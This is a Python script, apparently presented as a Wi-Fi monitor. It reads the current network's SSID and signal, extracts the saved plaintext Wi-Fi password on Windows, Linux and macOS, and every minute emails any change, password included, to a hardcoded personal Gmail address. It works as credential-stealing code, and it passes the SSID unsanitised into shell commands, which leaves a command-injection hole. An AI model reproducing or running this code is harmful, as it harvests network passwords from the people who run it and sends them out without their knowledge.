import platform
import subprocess
import filecmp
from Email_Report import send_email
import time

def get_wifi_details():
    system = platform.system()
    details = {}

    if system == "Windows":
        try:
            # Get Wi-Fi details
            result = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
            for line in result.splitlines():
                if "SSID" in line and "BSSID" not in line:
                    details["SSID"] = line.split(":", 1)[1].strip()
                elif "Radio type" in line:
                    details["Radio Type"] = line.split(":", 1)[1].strip()
                elif "Authentication" in line:
                    details["Authentication"] = line.split(":", 1)[1].strip()

            # Get password
            ssid = details.get("SSID")
            if ssid:
                password_result = subprocess.check_output(f'netsh wlan show profile name="{ssid}" key=clear', shell=True, text=True)
                for line in password_result.splitlines():
                    if "Key Content" in line:
                        details["Password"] = line.split(":", 1)[1].strip()
            return details
        except Exception as e:
            return {"Error": str(e)}

    elif system == "Linux":
        try:
            # Get Wi-Fi details
            result = subprocess.check_output("nmcli -t -f active,ssid,signal dev wifi", shell=True, text=True)
            for line in result.splitlines():
                parts = line.split(":")
                if len(parts) > 2 and parts[0] == "yes":
                    details["SSID"] = parts[1]
                    details["Signal Strength"] = f"{parts[2]}%"
                    
                    # Get password
                    password_result = subprocess.check_output(f'nmcli -s -g 802-11-wireless-security.psk connection show "{parts[1]}"', shell=True, text=True)
                    details["Password"] = password_result.strip()
            return details
        except Exception as e:
            return {"Error": str(e)}

    elif system == "Darwin":  # macOS
        try:
            # Get Wi-Fi details
            result = subprocess.check_output(
                "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I",
                shell=True, text=True
            )
            for line in result.splitlines():
                if line.strip().startswith("SSID:"):
                    details["SSID"] = line.split(":")[1].strip()
                elif line.strip().startswith("agrCtlRSSI:"):
                    details["Signal Strength (RSSI)"] = f"{line.split(':')[1].strip()} dBm"
                elif line.strip().startswith("auth:"):
                    details["Authentication"] = line.split(":")[1].strip()

            # Get password
            ssid = details.get("SSID")
            if ssid:
                password_result = subprocess.check_output(f'security find-generic-password -D "AirPort network password" -a "{ssid}" -w', shell=True, text=True)
                details["Password"] = password_result.strip()
            return details
        except Exception as e:
            return {"Error": str(e)}

    else:
        return {"Error": "Unsupported platform"}
    
def Clear_file(file_path: str):
    """
    Clears the content of a file by overwriting it with an empty string.

    Parameters:
    file_path (str): The path to the file to be cleared.
    """
    try:
        with open(file_path, "w") as f:
            f.write("")
    except FileNotFoundError as e:
        print(f"Error: {e}")
        
def Write_file(file_path: str, content: list):
    """
    Writes a list of content to a file.

    Parameters:
    file_path (str): The file path where the content will be written.
    content (list): The list of content to write into the file.
    """
    with open(file_path, "a") as f:
        for key, value in content.items():
            f.write(f"{key}: {value}\n")
            
def Compare_content():
    """
    Compares the content of two files.

    This function compares the content of two files specified by the file1 and file2 parameters.
    It uses the filecmp module to perform a shallow comparison of the files.

    Parameters:
    file1 (str): The path of the first file to compare.
    file2 (str): The path of the second file to compare.

    Returns:
    str: A string indicating whether the files are the same ("Same") or different ("Different").
         If a FileNotFoundError occurs while trying to open the files, the function prints the error message and returns None.
    """
    try:
        file1 = "Log\\Connected_wifi.log"
        file2 = "Temp\\Connected_wifi_temp.log"
        # Compare the two files using filecmp
        if filecmp.cmp(file1, file2, shallow=False):
            return "Same"
        else:
            return "Different"
    except FileNotFoundError as e:
        print(f"Error: {e}")
        
def Wifi_Monitor():
    while True:
        wifi_detail = get_wifi_details()

        Write_file("Temp\\Connected_wifi_temp.log", wifi_detail)
        time.sleep(1)

        if Compare_content() == "Same":
            Clear_file("Temp\\Connected_wifi_temp.log")
        else:
            f = open("Temp\\Connected_wifi_temp.log", "r")
            content = f.read()
            print(content)
            send_email("Jitin.k.sengar@gmail.com", "Wifi Report", f"{content}")
            Clear_file("Log\\Connected_wifi.log")
            Write_file("Log\\Connected_wifi.log", wifi_detail)
            Clear_file("Temp\\Connected_wifi_temp.log")

        time.sleep(60)
